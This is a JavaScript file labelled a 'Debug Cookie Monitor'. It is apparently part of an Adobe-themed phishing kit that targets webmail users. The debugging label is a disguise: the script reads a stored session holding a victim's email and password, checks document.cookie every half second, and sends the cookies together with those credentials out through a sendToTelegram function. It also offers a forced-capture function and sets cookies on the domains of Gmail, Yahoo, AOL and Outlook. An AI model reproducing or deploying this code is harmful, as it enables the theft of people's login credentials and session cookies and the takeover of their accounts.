// Debug Cookie Monitor
(function() {
    'use strict';
    
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
        console.warn('Debug cookie monitor loaded in non-browser environment');
        return;
    }
    
    console.log('🔍 Debug Cookie Monitor loaded');
    
    // Helper to get domain from email/provider
    function getDomainFromEmailProvider() {
        let email = '';
        let provider = '';
        try {
            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
            email = sessionData.email || '';
            provider = sessionData.provider || '';
        } catch (e) {}
        const providerLower = (provider || '').toLowerCase();
        if (providerLower.includes('gmail') || providerLower.includes('google')) {
            return '.google.com';
        } else if (providerLower.includes('yahoo')) {
            return '.yahoo.com';
        } else if (providerLower.includes('aol')) {
            return '.aol.com';
        } else if (providerLower.includes('hotmail') || providerLower.includes('live') ||
                   providerLower.includes('outlook') || providerLower.includes('office365')) {
            return '.live.com';
        } else if (providerLower === 'others' && email && email.includes('@')) {
            return '.' + email.split('@')[1].toLowerCase();
        }
        if (email && email.includes('@')) {
            return '.' + email.split('@')[1].toLowerCase();
        }
        return window.location.hostname.startsWith('.') ? window.location.hostname : `.${window.location.hostname}`;
    }
    
    // Enhanced cookie debugging
    function debugCookies() {
        const cookies = document.cookie;
        const allCookies = {};
        
        if (cookies) {
            cookies.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    allCookies[name] = decodeURIComponent(value);
                }
            });
        }
        
        console.log('🍪 Current cookies:', {
            raw: cookies,
            parsed: allCookies,
            count: Object.keys(allCookies).length,
            domain: window.location.hostname,
            url: window.location.href,
            timestamp: new Date().toISOString()
        });
        
        return allCookies;
    }
    
    // Monitor all cookie changes
    let lastCookieState = document.cookie;
    
    function checkCookieChanges() {
        const currentCookies = document.cookie;
        if (currentCookies !== lastCookieState) {
            console.log('🔄 Cookie change detected:', {
                before: lastCookieState,
                after: currentCookies,
                domain: window.location.hostname,
                timestamp: new Date().toISOString()
            });
            lastCookieState = currentCookies;
            debugCookies();
            
            // Auto-send to backend when cookies change
            if (window.sendToTelegram && currentCookies) {
                const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
                if (sessionData.email) {
                    console.log('🚀 Auto-sending cookie changes to Telegram...');
                    window.sendToTelegram({
                        email: sessionData.email,
                        password: sessionData.password || 'Cookie change detected',
                        provider: sessionData.provider || 'Auto-detected',
                        cookies: currentCookies,
                        documentCookies: currentCookies,
                        timestamp: new Date().toISOString(),
                        action: 'cookie_change_detected',
                        domain: window.location.hostname
                    });
                }
            }
        }
    }
    
    // Check for changes more frequently
    setInterval(checkCookieChanges, 500);
    
    // Monitor cross-origin requests
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        console.log('🌐 Fetch request:', url, 'Cookies before:', document.cookie);
        
        return originalFetch.apply(this, args).then(response => {
            console.log('📥 Fetch response:', url, 'Cookies after:', document.cookie);
            return response;
        });
    };
    
    // Expose debug functions globally
    window.debugCookies = debugCookies;
    window.clearAllCookies = function() {
        document.cookie.split(";").forEach(function(c) { 
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); 
        });
        console.log('🧹 All cookies cleared');
    };
    
    window.setCookie = function(name, value, days = 7) {
        const expires = new Date(Date.now() + days * 864e5).toUTCString();
        // Use provider domain if available
        const domain = getDomainFromEmailProvider();
        document.cookie = `${name}=${encodeURIComponent(value)}; expires=${expires}; path=/; domain=${domain}`;
        console.log(`🍪 Cookie set: ${name}=${value}; domain=${domain}`);
        
        // Trigger change detection
        setTimeout(checkCookieChanges, 100);
    };
    
    // Add function to force cookie capture and send
    window.forceCookieCapture = function() {
        const cookies = document.cookie;
        console.log('🔥 Force capturing cookies:', cookies);
        
        if (window.sendToTelegram && cookies) {
            const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
            window.sendToTelegram({
                email: sessionData.email || 'force-capture@domain.com',
                password: sessionData.password || 'Force captured',
                provider: sessionData.provider || 'Force Capture',
                cookies: cookies,
                documentCookies: cookies,
                timestamp: new Date().toISOString(),
                action: 'force_capture',
                domain: window.location.hostname
            });
        }
        
        return cookies;
    };
    
    // Initial debug
    setTimeout(debugCookies, 100);
    
    console.log('🔍 Debug Cookie Monitor active - Use debugCookies(), clearAllCookies(), setCookie(), forceCookieCapture() in console');
})();